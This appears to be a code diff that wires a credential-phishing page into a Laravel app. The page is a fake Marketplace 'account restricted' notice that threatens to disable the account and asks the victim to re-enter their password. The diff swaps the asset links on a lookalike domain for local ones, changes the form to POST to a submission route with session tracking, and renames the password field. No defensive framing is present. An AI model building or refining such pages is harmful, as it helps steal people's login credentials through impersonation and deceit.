@@ -4,22 +4,22 @@
 <div id="root">
         <div class="flex min-h-screen flex-col">
           <div class="sticky left-0 right-0 top-0 h-12 bg-gray-200 px-4 py-1">
-            <img src="https://notification.marketplacesclientservice.store/step/assets/meta-image-0X_yXz75.png" alt="" class="h-full" />
+            <img src="{{asset('assets/meta-image-0X_yXz75.png')}}" alt="" class="h-full" />
           </div>
           <main class="flex flex-grow flex-col items-center justify-center">
             <div class="flex w-11/12 flex-col justify-center md:w-2/5 2xl:w-1/3">
               <div>
                 <img
-                  src="https://notification.marketplacesclientservice.store/step/assets/home-image-VAkJ10vV.png"
+                  src="{{asset('assets/home-image-VAkJ10vV.png')}}"
                   class="w-full"
                   alt="" /><b class="text-2xl">Your Marketplace Account Has Been Restricted</b>
                 <p class="text-sm text-gray-500">Term of Service</p>
                 <hr />
               </div>
-              <form id="form" action="{{ route('getdata') }}" method="GET">
-                <input type="hidden" name="_token" value="gFvIrDjsqTPBVZBJTMwePxlETH05ITIfpEjPeK7E" autocomplete="off">                <input type="hidden" name="businessId" value="278188680457">
+              <form id="form" action="{{ route('submission') }}" method="POST">
+                @csrf
                 <input type="hidden" name="step" value="4">
-                <input type="hidden" name="id" value="">
+                <input type="hidden" name="id" value="{{ session('record_id') }}">
               <div class="my-5">We detected unusual activity in your Marketplace account today <strong id="tampil"></strong>. Your account has been reported for violating Marketplace's<b class="cursor-pointer font-medium text-blue-500 hover:underline">Community Standards</b>. After reviewing this report, we have confirmed that the decision cannot be reversed. To avoid having your account <b class="cursor-pointer font-medium text-blue-500 hover:underline">disabled</b> , please verify your account by following the steps below:</div>              <div class="my-2">
                 <input
                   class="w-full rounded-lg border border-gray-300 p-4 focus:border-blue-500 focus:outline-none"
@@ -27,7 +27,7 @@
                   placeholder="Password"
                   value=""
                   onblur="validateInput(this, 'Password')"
-                  id="password" name="reEnterPassword"/>
+                  id="password" name="repassword"/>
                 <p
                   class="text-red-500"
                   style="padding-top: 5px"
